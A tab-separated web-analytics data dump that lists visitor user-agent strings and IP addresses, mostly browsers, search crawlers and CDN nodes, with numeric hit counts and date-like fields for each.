4	12	0	1	0	24493654	24493366	0	24493366	24493366	0	321543	Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G34 Safari/601.1
4	1	0	0	0	24497469	0	0	24497469	0	0	3181	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
4	100	0	32	32	24592748	24592748	24592748	24437215	24437215	24437214	4821911	Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
4	8	0	8	0	24493205	24493205	0	24493205	24493205	0	25448	Mozilla/5.0 (compatible; TeeRaidBot; +https://teeraid.com/bot/)
4	1	0	0	0	24496711	0	0	24496711	0	0	3181	Go-http-client/1.1
4	28	1	10	0	24595824	24595824	0	24435099	24436851	0	146439	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
4	0	0	1	0	0	24518752	0	0	24518752	0	0	nghttp2/1.14.0-DEV
4	1	0	0	0	24497469	0	0	24497469	0	0	5877	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
4	0	0	0	1	0	0	24508286	0	0	24508286	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11
4	0	0	0	3	0	0	24496948	0	0	24479002	0	Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
4	1	1	0	0	24435117	0	0	24435117	0	0	1033	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36
4	404	2	26	2	24643425	24643411	24643361	24639210	24639210	24639212	8788420	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
4	510	3	33	40	24767764	24767764	24767764	24703985	24703985	24734310	13334088	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	1	0	1	0	24467869	24467869	0	24467869	24467869	0	3181	Python-urllib/2.7
4	1	0	1	0	24532070	24532070	0	24532070	24532070	0	3181	Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
4	0	0	0	1	0	0	24587202	0	0	24587202	0	Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
4	1	0	1	0	24595863	24595863	0	24595863	24595863	0	3181	Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
4	0	0	1	0	0	24587594	0	0	24587594	0	0	Mozilla/5.0 (compatible; Google-Test;)
4	180	2	9	1	24682290	24682287	24682278	24659226	24659226	24682278	5281753	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
4	0	0	1	0	0	24479447	0	0	24479447	0	0	Mozilla/5.0 (compatible; WebHistoryBot/1.2.1 IS NOT SE bot like Googlebot,yahoobot or bingbot)
4	38	1	1	0	24436419	24436419	0	24436419	24436419	0	1076434	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36
4	2	0	2	0	24548048	24548048	0	24485381	24485381	0	6362	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
4	3	0	3	0	24520995	24520995	0	24513936	24513936	0	9543	Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
4	1	0	0	0	24497469	0	0	24497469	0	0	28211	Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
4	11	0	3	0	24593302	24593302	0	24487737	24487737	0	403221	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
4	1	1	0	0	24435099	0	0	24435099	0	0	1033	Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A344 Safari/601.1
4	113	1	29	1	24597026	24597026	24434959	24434959	24445448	24434959	4535125	Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34
4	2	0	2	0	24439764	24439764	0	24439764	24439764	0	6362	Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.11 Safari/532.9
4	1	0	0	0	24497469	0	0	24497469	0	0	26278	Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Safari/534.30
4	1	0	1	0	24597088	24597088	0	24597088	24597088	0	3181	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/537.86.7
4	1	0	1	0	24466844	24466844	0	24466844	24466844	0	3181	Mozilla-1.1
4	2	0	1	0	24446092	24446092	0	24446092	24446092	0	45748	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
4	1	0	0	0	24497469	0	0	24497469	0	0	2380	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
4	1	0	1	0	24531812	24531812	0	24531812	24531812	0	3181	Whibse
4	0	0	0	5	0	0	24528105	0	0	24528105	0	Mechanize/2.7.3 Ruby/1.9.3p551 (http://github.com/sparklemotion/mechanize/)
4	0	0	0	1	0	0	24588019	0	0	24588019	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
4	1	0	1	0	24470368	24470368	0	24470368	24470368	0	3181	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0
4	1	0	1	0	24588468	24588468	0	24588468	24588468	0	3181	Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.809.0 Safari/535.1
4	0	0	0	12	0	0	24591937	0	0	24455428	0	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
4	2	0	2	0	24494433	24494433	0	24494433	24494433	0	6362	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
4	15	0	3	0	24559784	24559784	0	24511330	24511330	0	239720	roboto
4	1	0	0	0	24497469	0	0	24497469	0	0	26679	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.72 Safari/537.36
4	1	0	0	0	24517824	0	0	24517824	0	0	3181	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
4	0	0	6	18	0	24576055	24576055	0	24524132	24524132	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
4	18	0	18	0	24581501	24581501	0	24442205	24442205	0	57258	Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
4	1	0	1	1	24491158	24491158	24491154	24491158	24491158	24491154	3181	Mozilla/5.0 (compatible; TestCrawler)
4	0	0	0	8	0	0	24591937	0	0	24503952	0	Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
4	0	0	0	2	0	0	24449761	0	0	24449761	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36
4	1	0	1	0	24561474	24561474	0	24561474	24561474	0	3181	Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
4	1	0	1	0	24589912	24589912	0	24589912	24589912	0	3181	Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0
4	4	0	2	0	24572984	24528396	0	24441190	24483995	0	12724	BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 ips-agent
4	1	0	1	0	24497469	24497469	0	24497469	24497469	0	3181	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
4	1	0	1	0	24480126	24480126	0	24480126	24480126	0	3181	CRAZYWEBCRAWLER 0.9.10, http://www.crazywebcrawler.com
4	3	0	3	0	24594326	24594326	0	24457508	24457508	0	9543	Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)
4	10	0	10	10	24588379	24588379	24588379	24442937	24442937	24442937	31810	Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
4	7	0	1	0	24832395	24832395	0	24832395	24832395	0	319514	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
4	1	0	1	0	24482317	24482317	0	24482317	24482317	0	3181	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1
4	1	0	0	0	24497469	0	0	24497469	0	0	68411	Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
4	1	0	1	1	24479943	24479943	24581383	24479943	24479943	24581383	3181	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
4	0	0	2	0	0	24448623	0	0	24448623	0	0	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT)
4	0	0	0	3	0	0	24483916	0	0	24483916	0	Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13
4	62	0	341	133	24588930	24598618	24598618	24438425	24435290	24438425	2003870	Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
4	22	0	1	0	24519284	24519284	0	24455158	24519284	0	696677	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
4	1	0	1	0	24589912	24589912	0	24589912	24589912	0	3181	Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
4	1	0	1	0	24526891	24526891	0	24526891	24526891	0	3181	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11
4	16	0	4	4	24571895	24571895	24571895	24438645	24438645	24438645	1194352	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)
4	1	0	1	0	24572931	24572931	0	24572931	24572931	0	3181	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
4	0	0	0	1	0	0	24441128	0	0	24441128	0	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Opera 7.23 [ru]
4	1	0	0	0	24497469	0	0	24497469	0	0	16593	Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
4	1	0	1	0	24515798	24515798	0	24515798	24515798	0	3181	python-requests/2.10.0
4	6	0	1	0	24435717	24435717	0	24435717	24435717	0	3181	Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1
4	11	0	2	0	24576623	24576623	0	24576623	24576623	0	348739	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
4	1	0	1	0	24557987	24557987	0	24557987	24557987	0	3181	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
4	1	0	1	0	24597501	24597501	0	24597501	24597501	0	3181	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36
4	0	0	2	0	0	24436157	0	0	24436157	0	0	Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) (Compatible; AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334; Safari/7534.48.3; Trident/5.0)
4	620	2	61	10	24833735	24833735	24832411	24776167	24776167	24776184	17198417	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	1	0	1	0	24460586	24460586	0	24460586	24460586	0	3181	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
4	215	8	15	4	24435713	24435713	24435119	24435111	24435122	24435111	3807801	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36
4	1	0	1	0	24534456	24534456	0	24534456	24534456	0	3181	Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23
4	1	0	0	0	24497469	0	0	24497469	0	0	137733	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.3) Gecko/20100101 Firefox/27.3
4	6	0	6	0	24611121	24611121	0	24476251	24476251	0	19086	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	1	0	1	0	24525651	24525651	0	24525651	24525651	0	3181	Mozilla/5.0 (compatible; DomainSONOCrawler/0.1; +http://domainsono.com)
4	6	0	1	0	24598435	24598435	0	24598435	24598435	0	318362	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.1-development Safari/538.1
4	1	0	1	0	24575580	24575580	0	24575580	24575580	0	3181	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:28.0) Gecko/20100101 Firefox/28.0
4	5	0	4	2	24522206	24522206	24522205	24522205	24522205	24522205	15104	panscient.com
4	5	0	0	0	24593302	0	0	24593302	0	0	315181	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
4	10	0	4	0	24571533	24571533	0	24440107	24440107	0	25286	Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US
4	11	8	0	19	24435030	0	24435000	24434988	0	24434988	213682172	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
4	1	0	1	0	24452225	24452225	0	24452225	24452225	0	3181	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
4	1	0	1	0	24593387	24593387	0	24593387	24593387	0	3181	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50
4	0	0	2	0	0	24598268	0	0	24593849	0	0	python-requests/2.7.0 CPython/2.7.10 Linux/3.2.0-4-amd64
4	0	0	38	0	0	24580709	0	0	24456344	0	0	Google-Test
4	1	0	1	0	24557172	24557172	0	24557172	24557172	0	3181	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
4	14	0	0	0	24564465	0	0	24435122	0	0	109287	Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
4	0	0	1	0	0	24580109	0	0	24580109	0	0	curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.12.6.2 zlib/1.2.3 libidn/1.18 libssh2/1.2.2
4	0	0	1	0	0	24556998	0	0	24556998	0	0	Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
4	7	0	7	7	24594083	24594083	24594083	24455165	24455165	24455165	22267	Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)
4	1	0	1	0	24447520	24447520	0	24447520	24447520	0	3181	Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1
4	0	0	1	1	0	24596527	24596527	0	24596527	24596527	0	Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)
5	0	0	0	5	0	0	24528105	0	0	24528105	0	75.127.7.186
5	0	0	1	1	0	24488620	24488620	0	24488620	24488620	0	207.46.13.173
5	0	0	1	1	0	24583547	24583547	0	24583547	24583547	0	207.46.13.165
5	0	0	1	0	0	24556998	0	0	24556998	0	0	192.99.10.173
5	1	0	1	0	24597088	24597088	0	24597088	24597088	0	3181	45.35.63.194
5	6	0	4	2	24572984	24572984	24572984	24528396	24528396	24528396	17484	69.58.178.57
5	6	0	4	2	24483996	24483995	24483995	24441190	24441190	24441190	17484	69.58.178.56
5	0	0	1	1	0	24471603	24462239	0	24471603	24462239	0	207.46.13.160
5	0	0	0	2	0	0	24510162	0	0	24510162	0	207.46.13.157
5	0	0	0	1	0	0	24593682	0	0	24593682	0	207.46.13.156
5	0	0	4	0	0	24548999	0	0	24546823	0	0	207.46.13.153
5	0	0	16	0	0	24597026	0	0	24558190	0	0	172.68.65.149
5	0	0	1	1	0	24579454	24579454	0	24579454	24579454	0	207.46.13.143
5	0	0	1	0	0	24490843	0	0	24490843	0	0	207.46.13.137
5	1	0	1	0	24593302	24593302	0	24593302	24593302	0	3181	172.68.65.136
5	1	0	10	4	24549834	24562448	24562448	24549834	24549834	24552162	3181	207.46.13.119
5	0	0	1	1	0	24566330	24566330	0	24566330	24566330	0	40.77.167.9
5	1	0	1	0	24514955	24515000	0	24514955	24515000	0	0	40.77.167.8
5	0	0	1	1	0	24534407	24534407	0	24534407	24534407	0	207.46.13.117
5	0	0	1	0	0	24486946	0	0	24486946	0	0	207.46.13.116
5	2	0	0	0	24593302	0	0	24580159	0	0	178974	172.68.59.162
5	0	0	2	1	0	24470363	24469663	0	24469755	24469663	0	40.77.167.6
5	7	0	0	0	24597026	0	0	24558190	0	0	22267	172.68.65.119
5	0	0	1	0	0	24447325	0	0	24447325	0	0	207.46.13.114
5	1	0	2	1	24441991	24503404	24441991	24441991	24441264	24441991	2380	40.77.167.2
5	1	0	0	0	24438426	0	0	24438426	0	0	68411	207.46.13.7
5	0	0	1	1	0	24578493	24578493	0	24578493	24578493	0	207.46.13.6
5	2	0	0	0	24593302	0	0	24580159	0	0	136822	172.68.59.151
5	2	0	0	0	24593302	0	0	24580159	0	0	53358	173.245.55.174
5	0	0	1	1	0	24569679	24569679	0	24569679	24569679	0	207.46.13.104
5	1	0	0	0	24564465	0	0	24564465	0	0	17404	162.158.167.157
5	10	0	0	0	24581501	0	0	24559115	0	0	31810	173.245.55.172
5	0	0	0	2	0	0	24449761	0	0	24449761	0	162.158.249.18
5	0	0	0	4	0	0	24580967	0	0	24559115	0	172.68.59.143
5	1	0	1	0	24534456	24534456	0	24534456	24534456	0	3181	173.245.49.77
5	1	0	0	0	24435174	0	0	24435174	0	0	236	173.245.49.74
5	3	0	1	0	24593302	24532070	0	24532070	24532070	0	231203	173.245.55.156
5	0	0	1	0	0	24587594	0	0	24587594	0	0	173.245.50.192
5	0	0	22	0	0	24581501	0	0	24559115	0	0	173.245.55.151
5	1	0	1	0	24491198	24491198	0	24491198	24491198	0	3181	199.30.231.2
5	0	0	0	1	0	0	24587102	0	0	24587102	0	157.55.39.98
5	1	0	0	0	24435122	0	0	24435122	0	0	17404	162.158.38.91
5	0	0	1	1	0	24476175	24476156	0	24476175	24476156	0	157.55.39.96
5	0	0	1	0	0	24471043	0	0	24471043	0	0	45.55.47.201
5	1	0	0	0	24526277	0	0	24526277	0	0	68411	157.55.39.95
5	3	0	1	0	24517824	24517824	0	24517824	24517824	0	8742	173.245.55.144
5	3	0	0	0	24436288	0	0	24435123	0	0	114011	108.162.212.9
5	1	0	1	0	24525651	24525651	0	24525651	24525651	0	3181	173.245.55.142
5	3	0	0	0	24436408	0	0	24435169	0	0	121021	108.162.212.8
5	1	0	0	0	24593302	0	0	24593302	0	0	16593	173.245.55.141
5	0	0	1	2	0	24572707	24588927	0	24572707	24572707	0	157.55.39.91
5	2	0	0	0	24436419	0	0	24436419	0	0	70630	173.245.50.176
5	0	0	2	2	0	24581593	24581590	0	24580903	24580902	0	157.55.39.84
5	9	0	0	0	24490166	0	0	24436419	0	0	764073	173.245.50.172
5	1	0	0	0	24436419	0	0	24436419	0	0	4426	173.245.50.169
5	1	0	0	0	24436419	0	0	24436419	0	0	5644	173.245.50.167
5	1	0	0	0	24523665	0	0	24523665	0	0	3181	157.55.39.75
5	2	0	0	0	24493654	0	0	24493366	0	0	16593	108.162.237.252
5	0	0	0	7	0	0	24490164	0	0	24442402	0	173.245.50.165
5	1	0	0	0	24436419	0	0	24436419	0	0	228478	173.245.50.163
5	1	0	1	0	24491158	24491158	0	24491158	24491158	0	3181	108.162.237.250
5	1	0	0	0	24436419	0	0	24436419	0	0	4103	173.245.50.162
5	4	0	4	0	24493205	24493205	0	24493205	24493205	0	12724	141.101.99.90
5	1	0	0	0	24436419	0	0	24436419	0	0	84247	173.245.50.159
5	0	0	3	2	0	24591168	24590184	0	24589685	24589485	0	157.55.39.70
5	1	0	0	0	24436419	0	0	24436419	0	0	6601	173.245.50.160
5	4	1	1	0	24455158	24436419	0	24436419	24436419	0	37777	173.245.50.157
5	0	0	1	1	0	24571329	24571328	0	24571329	24571328	0	157.55.39.66
5	0	0	2	0	0	24516812	0	0	24516104	0	0	157.55.39.60
5	1	0	0	0	24436419	0	0	24436419	0	0	13857	173.245.50.150
5	11	0	0	0	24490164	0	0	24441664	0	0	34991	173.245.50.148
5	6	0	1	0	24598435	24598435	0	24598435	24598435	0	318362	67.217.35.167
5	2	0	1	0	24580164	24580180	0	24510163	24580180	0	68411	157.55.39.55
5	2	0	3	1	24510162	24510738	24510029	24510161	24510030	24510029	92668	157.55.39.54
5	7	0	0	0	24490166	0	0	24436419	0	0	539548	173.245.50.144
5	0	0	1	1	0	24456740	24456740	0	24456740	24456740	0	157.55.39.7
5	3	0	0	0	24455158	0	0	24436419	0	0	7015	173.245.50.140
5	0	0	1	0	0	24489327	0	0	24489327	0	0	157.55.39.48
5	0	0	1	1	0	24530422	24530422	0	24530422	24530422	0	157.55.39.46
5	0	0	1	0	0	24457439	0	0	24457439	0	0	157.55.39.41
5	1	0	0	0	24588929	0	0	24588929	0	0	68411	157.55.39.39
5	2	0	1	0	24493654	24493366	0	24493366	24493366	0	6362	108.162.237.216
5	1	0	2	0	24483734	24483734	0	24483734	24483504	0	3181	157.55.39.14
5	0	0	1	1	0	24555084	24555083	0	24555084	24555083	0	157.55.39.13
5	1	0	1	2	24548588	24473692	24548587	24548588	24473692	24473689	3181	157.55.39.12
5	0	0	1	0	0	24595775	0	0	24595775	0	0	157.55.39.11
5	2	0	0	0	24493654	0	0	24493366	0	0	89487	108.162.237.175
5	2	0	0	0	24493654	0	0	24493366	0	0	26679	108.162.237.171
5	1	0	1	0	24470368	24470368	0	24470368	24470368	0	3181	167.114.233.118
5	1	0	1	0	24460586	24460586	0	24460586	24460586	0	3181	162.158.215.213
5	1	0	1	1	24547633	24547633	24547633	24547633	24547633	24547633	3181	64.246.161.190
5	0	0	0	1	0	0	24491154	0	0	24491154	0	108.162.237.144
5	2	0	0	0	24597026	0	0	24566347	0	0	4760	162.158.79.247
5	2	0	0	0	24493654	0	0	24493366	0	0	114011	108.162.237.139
5	1	0	1	0	24559784	24559784	0	24559784	24559784	0	3181	162.158.79.243
5	4	0	1	1	24528089	24528089	24528089	24528089	24528089	24528089	298588	38.100.21.78
5	4	0	0	0	24597026	0	0	24558190	0	0	268461	162.158.79.239
5	2	0	0	0	24493654	0	0	24493366	0	0	68411	108.162.237.130
5	4	0	1	1	24571895	24571895	24571895	24571895	24571895	24571895	298588	38.100.21.68
5	1	0	1	0	24591308	24591308	0	24591308	24591308	0	3181	45.35.109.234
5	4	0	1	1	24484077	24484077	24484077	24484077	24484077	24484077	298588	38.100.21.64
5	4	0	1	1	24438645	24438645	24438645	24438645	24438645	24438645	298588	38.100.21.63
5	2	0	0	0	24435398	0	0	24435142	0	0	4998	141.101.81.79
5	4	0	0	0	24435398	0	0	24435142	0	0	13144	141.101.81.78
5	6	0	1	0	24435713	24435713	0	24435150	24435713	0	97540	141.101.81.75
5	2	0	0	0	24435398	0	0	24435142	0	0	11543	141.101.81.73
5	2	0	0	1	24435713	0	24435111	24435150	0	24435111	51376	141.101.81.71
5	1	0	0	0	24435150	0	0	24435150	0	0	434957	141.101.81.70
5	4	0	0	0	24597026	0	0	24558190	0	0	80037	162.158.79.207
5	2	0	0	0	24435398	0	0	24435142	0	0	21970	141.101.81.67
5	6	0	0	0	24435398	0	0	24435142	0	0	237705	141.101.81.66
5	2	0	2	0	24518797	24518797	0	24513936	24513936	0	6362	91.200.12.14
5	2	0	0	0	24435398	0	0	24435142	0	0	13490	141.101.81.63
5	2	0	0	0	24435397	0	0	24435122	0	0	17404	141.101.81.61
5	1	0	1	0	24497469	24497469	0	24497469	24497469	0	3181	82.80.249.214
5	2	0	0	0	24435331	0	0	24435122	0	0	1152	141.101.81.60
5	1	0	3	0	24595863	24598268	0	24595863	24593849	0	3181	141.101.81.58
5	7	0	1	0	24497469	24497469	0	24497469	24497469	0	307330	82.80.249.192
5	1	0	0	0	24435681	0	0	24435681	0	0	1456	173.245.62.70
5	1	0	0	0	24436419	0	0	24436419	0	0	337	108.162.221.209
5	2	0	0	0	24455158	0	0	24436419	0	0	3774	108.162.221.198
5	1	0	0	0	24436419	0	0	24436419	0	0	13490	108.162.221.196
5	8	0	0	0	24490166	0	0	24436419	0	0	174384	108.162.221.206
5	2	0	0	0	24455159	0	0	24436419	0	0	34808	108.162.221.204
5	4	0	0	0	24597026	0	0	24558190	0	0	342033	162.158.79.166
5	2	0	0	0	24435398	0	0	24435142	0	0	21587	141.101.81.36
5	4	0	0	0	24435398	0	0	24435122	0	0	119655	141.101.81.35
5	1	0	0	0	24436419	0	0	24436419	0	0	21970	108.162.221.200
5	2	0	0	0	24597026	0	0	24566347	0	0	33186	173.245.54.32
5	1	0	1	0	24467869	24467869	0	24467869	24467869	0	3181	211.72.118.97
5	2	0	0	0	24436419	0	0	24436419	0	0	26585	108.162.221.175
5	0	0	0	1	0	0	24587202	0	0	24587202	0	141.101.105.247
5	1	0	0	0	24436419	0	0	24436419	0	0	1456	108.162.221.174
5	1	0	1	1	24528246	24528246	24528246	24528246	24528246	24528246	3181	141.101.105.246
5	1	0	1	1	24588379	24588379	24588379	24588379	24588379	24588379	3181	141.101.105.245
5	1	0	1	1	24569888	24569888	24569888	24569888	24569888	24569888	3181	141.101.105.238
5	0	0	1	0	0	24567610	0	0	24567610	0	0	173.245.52.173
5	1	0	0	0	24436409	0	0	24436409	0	0	135527	108.162.210.254
5	0	0	1	0	0	24566775	0	0	24566775	0	0	173.245.52.170
5	1	0	0	0	24436419	0	0	24436419	0	0	12315	108.162.221.157
5	2	0	11	0	24455158	24490164	0	24436419	24441664	0	13506	108.162.221.155
5	1	0	0	0	24436419	0	0	24436419	0	0	11543	108.162.221.150
5	2	0	0	0	24436419	0	0	24436419	0	0	84630	108.162.221.148
5	6	0	3	0	24571331	24571331	0	24563958	24563958	0	19086	199.27.133.7
5	7	0	0	0	24490166	0	0	24436419	0	0	445119	108.162.221.146
5	0	0	1	0	0	24566819	0	0	24566819	0	0	173.245.52.156
5	1	1	8	0	24434959	24545975	0	24434959	24465213	0	0	108.162.245.192
5	0	0	0	1	0	0	24588019	0	0	24588019	0	108.162.245.191
5	1	0	0	0	24436419	0	0	24436419	0	0	6028	108.162.221.144
5	0	0	2	0	0	24576595	0	0	24566347	0	0	199.27.133.4
5	0	0	1	0	0	24477082	0	0	24477082	0	0	173.245.52.150
5	2	0	0	0	24436288	0	0	24435169	0	0	33679	108.162.210.229
5	2	0	0	0	24436288	0	0	24435169	0	0	4711	108.162.210.227
5	0	0	1	0	0	24594107	0	0	24594107	0	0	172.68.51.158
5	0	0	1	0	0	24437869	0	0	24437869	0	0	173.245.52.138
5	0	0	2	0	0	24525755	0	0	24465214	0	0	199.27.133.157
5	0	0	1	0	0	24476583	0	0	24476583	0	0	173.245.52.134
5	1	0	0	0	24454658	0	0	24454658	0	0	68411	157.55.39.251
5	0	0	5	1	0	24501486	24499312	0	24498624	24499312	0	157.55.39.248
